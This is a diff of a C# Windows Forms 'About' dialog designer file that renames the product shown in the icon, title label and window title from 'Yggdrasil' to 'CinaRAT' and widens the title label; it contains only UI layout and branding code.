@@ -43,7 +43,7 @@
             // 
             // picIcon
             // 
-            this.picIcon.Image = global::xServer.Properties.Resources.Yggdrasil_Server;
+            this.picIcon.Image = global::xServer.Properties.Resources.CinaRAT_Server;
             this.picIcon.Location = new System.Drawing.Point(12, 12);
             this.picIcon.Name = "picIcon";
             this.picIcon.Size = new System.Drawing.Size(64, 64);
@@ -57,9 +57,9 @@
             this.lblTitle.Font = new System.Drawing.Font("Segoe UI", 15.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
             this.lblTitle.Location = new System.Drawing.Point(82, 7);
             this.lblTitle.Name = "lblTitle";
-            this.lblTitle.Size = new System.Drawing.Size(79, 30);
+            this.lblTitle.Size = new System.Drawing.Size(96, 30);
             this.lblTitle.TabIndex = 0;
-            this.lblTitle.Text = "Yggdrasil";
+            this.lblTitle.Text = "CinaRAT";
             // 
             // lblVersion
             // 
@@ -157,7 +157,7 @@
             this.MinimizeBox = false;
             this.Name = "FrmAbout";
             this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
-            this.Text = "Yggdrasil - About";
+            this.Text = "CinaRAT - About";
             ((System.ComponentModel.ISupportInitialize)(this.picIcon)).EndInit();
             this.ResumeLayout(false);
             this.PerformLayout();
